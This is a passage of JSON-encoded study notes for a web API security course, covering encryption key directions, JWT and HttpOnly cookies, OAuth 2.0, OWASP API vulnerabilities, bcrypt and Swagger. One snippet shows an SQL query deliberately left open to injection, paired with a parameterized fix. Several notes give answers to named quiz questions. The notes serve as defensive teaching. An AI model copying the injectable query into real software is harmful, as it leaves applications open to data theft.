error.","body_html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e\u003c/th\u003e\n\u003cth\u003eSymmetric\u003c/th\u003e\n\u003cth\u003eAsymmetric\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eKeys\u003c/td\u003e\n\u003ctd\u003e1 secret key (shared)\u003c/td\u003e\n\u003ctd\u003ePublic + private per party\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eKey exchange needed?\u003c/td\u003e\n\u003ctd\u003eYes (the hard problem)\u003c/td\u003e\n\u003ctd\u003eNo\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eSpeed\u003c/td\u003e\n\u003ctd\u003eFast\u003c/td\u003e\n\u003ctd\u003eSlower\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eAlgorithms\u003c/td\u003e\n\u003ctd\u003eAES\u003c/td\u003e\n\u003ctd\u003eRSA, Diffie-Hellman\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e\n\u003cp\u003e\u003cstrong\u003eKey directions (OPPOSITE for signing vs encryption):\u003c/strong\u003e\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eOperation\u003c/th\u003e\n\u003cth\u003eSender uses\u003c/th\u003e\n\u003cth\u003eReceiver uses\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eSigning\u003c/td\u003e\n\u003ctd\u003eSender&#39;s \u003cstrong\u003eprivate\u003c/strong\u003e key\u003c/td\u003e\n\u003ctd\u003eSender&#39;s \u003cstrong\u003epublic\u003c/strong\u003e key (verify)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eEncryption\u003c/td\u003e\n\u003ctd\u003eReceiver&#39;s \u003cstrong\u003epublic\u003c/strong\u003e key\u003c/td\u003e\n\u003ctd\u003eReceiver&#39;s \u003cstrong\u003eprivate\u003c/strong\u003e key (decrypt)\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e\n\u003cp\u003e\u003cstrong\u003eAmir→Tom double-envelope (ISAQuiz11 Q9):\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eEncrypt with Tom&#39;s \u003cstrong\u003epublic\u003c/strong\u003e key → only Tom&#39;s \u003cstrong\u003eprivate\u003c/strong\u003e key opens\u003c/li\u003e\n\u003cli\u003eSign with Amir&#39;s \u003cstrong\u003eprivate\u003c/strong\u003e key → Tom verifies with Amir&#39;s \u003cstrong\u003epublic\u003c/strong\u003e key\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e Verification uses the SENDER&#39;s public key (not receiver&#39;s). Confusing verify/decrypt = most common Q9 error.\u003c/p\u003e"},{"heading":"JWT — structure, signing, storage","body_md":"**Structure:** `base64url(header).base64url(payload).base64url(signature)` (NOT body/footer/certificate)\n\n**Sign:** `jwt.sign({ username }, TOKEN_SECRET, { algorithm: 'HS256', expiresIn: '120s' })`\n**Verify:** `jwt.verify(token, TOKEN_SECRET)` → decoded payload or throws\n\n**Deliver via HttpOnly cookie** (not localStorage — readable by JS):\n`res.setHeader('Set-Cookie', 'token=...; HttpOnly; Path=/; SameSite=None; Secure; Max-Age=120')`\n\n**TOKEN_SECRET:** `process.env.TOKEN_SECRET` — never hardcode. Generate: `crypto.randomBytes(64).toString('hex')`\n\n**Pitfall (ISAQuiz11 Q8):** No HttpOnly + no Secure = XSS + CSRF + unauthorized access (all three). Selecting only XSS scores zero.","body_html":"\u003cp\u003e\u003cstrong\u003eStructure:\u003c/strong\u003e \u003ccode\u003ebase64url(header).base64url(payload).base64url(signature)\u003c/code\u003e (NOT body/footer/certificate)\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eSign:\u003c/strong\u003e \u003ccode\u003ejwt.sign({ username }, TOKEN_SECRET, { algorithm: &#39;HS256&#39;, expiresIn: &#39;120s&#39; })\u003c/code\u003e\n\u003cstrong\u003eVerify:\u003c/strong\u003e \u003ccode\u003ejwt.verify(token, TOKEN_SECRET)\u003c/code\u003e → decoded payload or throws\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eDeliver via HttpOnly cookie\u003c/strong\u003e (not localStorage — readable by JS):\n\u003ccode\u003eres.setHeader(&#39;Set-Cookie&#39;, &#39;token=...; HttpOnly; Path=/; SameSite=None; Secure; Max-Age=120&#39;)\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTOKEN_SECRET:\u003c/strong\u003e \u003ccode\u003eprocess.env.TOKEN_SECRET\u003c/code\u003e — never hardcode. Generate: \u003ccode\u003ecrypto.randomBytes(64).toString(&#39;hex&#39;)\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall (ISAQuiz11 Q8):\u003c/strong\u003e No HttpOnly + no Secure = XSS + CSRF + unauthorized access (all three). Selecting only XSS scores zero.\u003c/p\u003e"},{"heading":"OAuth 2.0 and SSL/TLS","body_md":"**SSL/TLS:** TLS is current; SSL is deprecated. HTTPS = HTTP over TLS. TLS handshake: server sends certificate (contains public key) → negotiate session key → all data encrypted automatically. App code does NOT implement this.\n\n**OAuth 2.0 flow:**\n1. App owner registers → gets **client ID** (public) + **client secret** (private, server only)\n2. User clicks Login → ClientApp redirects to Google with `client_id` + scope\n3. Google shows consent screen → user clicks Allow\n4. Google issues **bearer token** → redirects to ClientApp\n5. ClientApp uses `Authorization: Bearer \u003ctoken\u003e` header for all future requests\n\n**Bearer token:** possession = authorization. Anyone holding it is authorized. Must be kept private. Time-limited (e.g., 6 months).\n\n**Delegation:** ClientApp never sees Google password. OAuth 2.0 hands authentication to Google.","body_html":"\u003cp\u003e\u003cstrong\u003eSSL/TLS:\u003c/strong\u003e TLS is current; SSL is deprecated. HTTPS = HTTP over TLS. TLS handshake: server sends certificate (contains public key) → negotiate session key → all data encrypted automatically. App code does NOT implement this.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eOAuth 2.0 flow:\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eApp owner registers → gets \u003cstrong\u003eclient ID\u003c/strong\u003e (public) + \u003cstrong\u003eclient secret\u003c/strong\u003e (private, server only)\u003c/li\u003e\n\u003cli\u003eUser clicks Login → ClientApp redirects to Google with \u003ccode\u003eclient_id\u003c/code\u003e + scope\u003c/li\u003e\n\u003cli\u003eGoogle shows consent screen → user clicks Allow\u003c/li\u003e\n\u003cli\u003eGoogle issues \u003cstrong\u003ebearer token\u003c/strong\u003e → redirects to ClientApp\u003c/li\u003e\n\u003cli\u003eClientApp uses \u003ccode\u003eAuthorization: Bearer &lt;token&gt;\u003c/code\u003e header for all future requests\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cstrong\u003eBearer token:\u003c/strong\u003e possession = authorization. Anyone holding it is authorized. Must be kept private. Time-limited (e.g., 6 months).\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eDelegation:\u003c/strong\u003e ClientApp never sees Google password. OAuth 2.0 hands authentication to Google.\u003c/p\u003e"},{"heading":"API security vulnerabilities (OWASP top 8 for APIs)","body_md":"| # | Vulnerability | Fix |\n|---|---|---|\n| 1 | Broken User Authentication | MFA, session timeout, rate-limit + lockout login, bcrypt |\n| 2 | Excessive Data Exposure | Server-side field filtering; generic error messages |\n| 3 | Lack of Rate Limiting | `express-rate-limit` at IP + account + app level |\n| 4 | Broken Function Level Authorization | `if (req.user.role !== 'admin') return 403` |\n| 5 | Broken Object-Level Authorization (BOLA) | Check object ownership, not just authentication |\n| 6 | Mass Assignment | Whitelist fields: `const { name, email } = req.body` |\n| 7 | Security Misconfiguration | Secrets in env vars; disable unused services |\n| 8 | Injection (SQL/NoSQL/Command) | Parameterized queries with `?` placeholders |\n\n**SQL injection pattern (ISAQuiz12 Q2):**\n```js\n// Vulnerable:\nconst query = `UPDATE users SET email='${newEmail}' WHERE id=${userId}`;\n// Safe:\nconst query = 'UPDATE users SET email=? WHERE id=?';\ndatabase.query(query, [newEmail, userId]);\n```\n**Pitfall:** `.replace()` is NOT a fix — bypassable with hex encodings. Only parameterized queries work.\n\n**BOLA pattern (ISAQuiz12 Q7):** `getResourceOwner()` that hardcodes owner ID = always returns same user = any authenticated user passes.","body_html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e#\u003c/th\u003e\n\u003cth\u003eVulnerability\u003c/th\u003e\n\u003cth\u003eFix\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e1\u003c/td\u003e\n\u003ctd\u003eBroken User Authentication\u003c/td\u003e\n\u003ctd\u003eMFA, session timeout, rate-limit + lockout login, bcrypt\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e2\u003c/td\u003e\n\u003ctd\u003eExcessive Data Exposure\u003c/td\u003e\n\u003ctd\u003eServer-side field filtering; generic error messages\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e3\u003c/td\u003e\n\u003ctd\u003eLack of Rate Limiting\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eexpress-rate-limit\u003c/code\u003e at IP + account + app level\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e4\u003c/td\u003e\n\u003ctd\u003eBroken Function Level Authorization\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eif (req.user.role !== &#39;admin&#39;) return 403\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e5\u003c/td\u003e\n\u003ctd\u003eBroken Object-Level Authorization (BOLA)\u003c/td\u003e\n\u003ctd\u003eCheck object ownership, not just authentication\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e6\u003c/td\u003e\n\u003ctd\u003eMass Assignment\u003c/td\u003e\n\u003ctd\u003eWhitelist fields: \u003ccode\u003econst { name, email } = req.body\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e7\u003c/td\u003e\n\u003ctd\u003eSecurity Misconfiguration\u003c/td\u003e\n\u003ctd\u003eSecrets in env vars; disable unused services\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e8\u003c/td\u003e\n\u003ctd\u003eInjection (SQL/NoSQL/Command)\u003c/td\u003e\n\u003ctd\u003eParameterized queries with \u003ccode\u003e?\u003c/code\u003e placeholders\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e\n\u003cp\u003e\u003cstrong\u003eSQL injection pattern (ISAQuiz12 Q2):\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003e// Vulnerable:\nconst query = `UPDATE users SET email=&#39;${newEmail}&#39; WHERE id=${userId}`;\n// Safe:\nconst query = &#39;UPDATE users SET email=? WHERE id=?&#39;;\ndatabase.query(query, [newEmail, userId]);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e \u003ccode\u003e.replace()\u003c/code\u003e is NOT a fix — bypassable with hex encodings. Only parameterized queries work.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eBOLA pattern (ISAQuiz12 Q7):\u003c/strong\u003e \u003ccode\u003egetResourceOwner()\u003c/code\u003e that hardcodes owner ID = always returns same user = any authenticated user passes.\u003c/p\u003e"},{"heading":"Password hashing with bcrypt","body_md":"**Hash ≠ Encrypt:** Hash is one-way (no key, irreversible). Encrypt is reversible (key on server = risk). Always hash passwords.\n\n```js\n// Register — hash before storing\nconst hashedPassword = await bcrypt.hash(password, 10); // 10 = cost factor\n\n// Login — compare, never decrypt\nconst match = await bcrypt.compare(plaintext, storedHash); // → boolean\n```\n\n**Cost factor:** 2nd arg to `bcrypt.hash()`. `10` → 2^10 = 1,024 iterations. Higher = slower = harder brute-force.\n\n**Pitfall:** Omit `await` → variable holds a Promise object, not a hash. All logins break silently.","body_html":"\u003cp\u003e\u003cstrong\u003eHash ≠ Encrypt:\u003c/strong\u003e Hash is one-way (no key, irreversible). Encrypt is reversible (key on server = risk). Always hash passwords.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003e// Register — hash before storing\nconst hashedPassword = await bcrypt.hash(password, 10); // 10 = cost factor\n\n// Login — compare, never decrypt\nconst match = await bcrypt.compare(plaintext, storedHash); // → boolean\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eCost factor:\u003c/strong\u003e 2nd arg to \u003ccode\u003ebcrypt.hash()\u003c/code\u003e. \u003ccode\u003e10\u003c/code\u003e → 2^10 = 1,024 iterations. Higher = slower = harder brute-force.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e Omit \u003ccode\u003eawait\u003c/code\u003e → variable holds a Promise object, not a hash. All logins break silently.\u003c/p\u003e"},{"heading":"Swagger / OpenAPI documentation","body_md":"**OpenAPI / Swagger** = Interface Description Language for RESTful APIs. Produces `swagger.json` (JSON or YAML).\n\n**swagger.json documents:** endpoints (path + HTTP method), request params, request body schema, response schemas + status codes, auth requirements.\n\n**Minimal structure:**\n```json\n{ \"openapi\": \"3.0.0\", \"info\": { \"title\": \"...\", \"version\": \"1.0.0\" }, \"paths\": { \"/endpoint\": { \"get\": { \"summary\": \"...\", \"responses\": { \"200\": { \"description\": \"...\" } } } } } }\n```\n\n**Workflow:** editor.swagger.io → File \u003e Convert and Save as JSON → open in VS Code → install Swagger Viewer extension → Shift+Alt+P (Preview Swagger) → edit `paths` block.","body_html":"\u003cp\u003e\u003cstrong\u003eOpenAPI / Swagger\u003c/strong\u003e = Interface Description Language for RESTful APIs. Produces \u003ccode\u003eswagger.json\u003c/code\u003e (JSON or YAML).\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eswagger.json documents:\u003c/strong\u003e endpoints (path + HTTP method), request params, request body schema, response schemas + status codes, auth requirements.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eMinimal structure:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-json\"\u003e{ &quot;openapi&quot;: &quot;3.0.0&quot;, &quot;info&quot;: { &quot;title&quot;: &quot;...&quot;, &quot;version&quot;: &quot;1.0.0&quot; }, &quot;paths&quot;: { &quot;/endpoint&quot;: { &quot;get&quot;: { &quot;summary&quot;: &quot;...&quot;, &quot;responses&quot;: { &quot;200&quot;: { &quot;description&quot;: &quot;...&quot; } } } } } }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eWorkflow:\u003c/strong\u003e editor.swagger.io → File &gt; Convert and Save as JSON → open in VS Code → install Swagger Viewer extension → Shift+Alt+P (Preview Swagger) → edit \u003ccode\u003epaths\u003c/code\u003e block.\u003c/p\u003e"}]}};
